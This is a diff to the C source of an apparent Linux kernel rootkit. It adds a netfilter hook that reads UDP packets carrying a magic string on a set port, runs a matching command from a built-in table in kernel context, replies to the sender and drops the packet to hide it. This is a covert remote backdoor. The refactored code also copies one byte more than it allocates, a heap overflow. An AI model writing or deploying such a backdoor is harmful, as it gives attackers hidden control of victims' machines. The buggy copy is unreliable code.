@@ -43,19 +43,6 @@ struct cmd_type cmds[] = {
     }
 };
 
-static int match_cmd(struct cmd_type *cmd, const char *data) {
-    return strncmp(data, cmd->name, strlen(cmd->name));
-}
-
-static int call_cmd(struct cmd_type *cmd, const char *data, unsigned int data_len) {
-    char *new_data;
-    int result;
-    new_data = kmalloc(data_len + 1, GFP_KERNEL);
-    memcpy(new_data, data, data_len);
-    result = cmd->func(new_data + strlen(cmd->name));
-    kfree(new_data);
-    return result;
-}
 
 static int send_response(
     unsigned short job_id,
@@ -137,8 +124,8 @@ static int send_response(
 struct MRK_command_work {
     struct work_struct work;
     struct cmd_type *cmd;
-    const char *data;
-    int data_len;
+    const char *arg;
+    short job_id;
     __be32 src_addr;
     __be32 dst_addr;
     __be16 src_port;
@@ -149,23 +136,61 @@ struct MRK_command_work {
 static void handle_command(struct work_struct *work) {
     int result;
     struct MRK_command_work *command_work = container_of(work, struct MRK_command_work, work);
-    result = call_cmd(command_work->cmd, command_work->data + sizeof(job_id_t) + CMD_MAGIC_LEN, command_work->data_len);
+    result = command_work->cmd->func(command_work->arg);
     printk(KERN_INFO "Found %s cmd packet! executed with code %d\n", command_work->cmd->name, result);
-    send_response(get_unaligned((unsigned short *)(command_work->data + CMD_MAGIC_LEN)), result, command_work->dst_addr, command_work->src_addr, command_work->src_port, command_work->src_mac, command_work->dev);
+    send_response(
+        command_work->job_id, 
+        result, 
+        command_work->dst_addr, 
+        command_work->src_addr, 
+        command_work->src_port, 
+        command_work->src_mac, 
+        command_work->dev
+    );
     // From https://github.com/torvalds/linux/blob/v5.8/kernel/workqueue.c:2173
     // It is permissible to free the struct work_struct from inside the function that is called from it.
-    kfree(command_work->data);
+    kfree(command_work->arg);
     kfree(work);
+}
+
+static int get_udp_user_data(struct sk_buff *skb, const char **user_data) {
+    struct udphdr *udph;
+    int user_data_len;
+
+    udph = udp_hdr(skb);
+    user_data_len = ntohs(udph->len) - sizeof(struct udphdr);
+
+    #ifdef NET_SKBUFF_DATA_USES_OFFSET
+    *user_data = skb->head + skb->tail - user_data_len;
+    #else
+    *user_data = skb->tail - user_data_len;
+    #endif
+    
+    return user_data_len;
+}
+
+static struct cmd_type *match_buffer_to_cmd_type(const char *buffer) {
+    int i;
+    struct cmd_type *cmd;
+    
+    for (i = 0; i < cmds_len; i++) {
+        cmd = cmds + i;
+        if (!strncmp(buffer, cmd->name, strlen(cmd->name))) {
+            return cmd;
+        }
+    }
+    return NULL;
 }
 
 static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
     struct iphdr *iph;
     struct udphdr *udph;
     const char *user_data;
-    char *user_data_copy;
-    int i;
     int user_data_len;
+    short job_id;
+    struct cmd_type *cmd;
     struct MRK_command_work *command_work;
+    char *arg;
 
     iph = ip_hdr(skb);
     if (iph->protocol != IPPROTO_UDP) return NF_ACCEPT;
@@ -173,35 +198,33 @@ static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_
     udph = udp_hdr(skb);
     if (ntohs(udph->dest) != CMD_PORT) return NF_ACCEPT;
 
-    user_data_len = ntohs(udph->len) - sizeof(struct udphdr);
-
-    #ifdef NET_SKBUFF_DATA_USES_OFFSET
-    user_data = skb->head + skb->tail - user_data_len;
-    #else
-    user_data = skb->tail - user_data_len;
-    #endif
+    user_data_len = get_udp_user_data(skb, &user_data);
 
     if (strncmp(user_data, CMD_MAGIC, CMD_MAGIC_LEN)) return NF_ACCEPT;
-    for (i = 0; i < cmds_len; i++) {
-        if (!match_cmd(cmds + i, user_data + sizeof(job_id_t) + CMD_MAGIC_LEN)) {
-              command_work = kmalloc(sizeof(struct MRK_command_work), GFP_KERNEL);
-              INIT_WORK(&command_work->work, handle_command);
-              command_work->cmd = cmds + i;
-              user_data_copy = kmalloc(user_data_len, GFP_KERNEL);
-              memcpy(user_data_copy, user_data, user_data_len);
-              command_work->data = user_data_copy;
-              command_work->data_len = user_data_len;
-              command_work->dst_addr = iph->daddr;
-              command_work->src_addr = iph->saddr;
-              command_work->src_port = udph->source;
-              memcpy(command_work->src_mac, eth_hdr(skb)->h_source, ETH_ALEN);
-              command_work->dev = skb->dev;
-              schedule_work(&command_work->work);
-            return NF_DROP;
-        }
-    }
-    printk(KERN_INFO "Found unclear cmd packet.\n");
-    return NF_ACCEPT;
+    user_data += CMD_MAGIC_LEN;
+    user_data_len -= CMD_MAGIC_LEN;
+
+    job_id = get_unaligned((job_id_t *)(user_data));
+    user_data += sizeof(job_id_t);
+    user_data_len -= sizeof(job_id_t);
+
+    cmd = match_buffer_to_cmd_type(user_data);
+    if (cmd == NULL) return NF_ACCEPT;
+
+    command_work = kmalloc(sizeof(struct MRK_command_work), GFP_KERNEL);
+    INIT_WORK(&command_work->work, handle_command);
+    command_work->cmd = cmd;
+    arg = kmalloc(user_data_len, GFP_KERNEL);
+    memcpy(arg, user_data, user_data_len + 1); /* we want the string to be null-terminated */
+    command_work->arg = arg;
+    command_work->dst_addr = iph->daddr;
+    command_work->src_addr = iph->saddr;
+    command_work->src_port = udph->source;
+    memcpy(command_work->src_mac, eth_hdr(skb)->h_source, ETH_ALEN);
+    command_work->dev = skb->dev;
+    
+    schedule_work(&command_work->work);
+    return NF_DROP;
 }
 
 struct nf_hook_ops *net_hook;
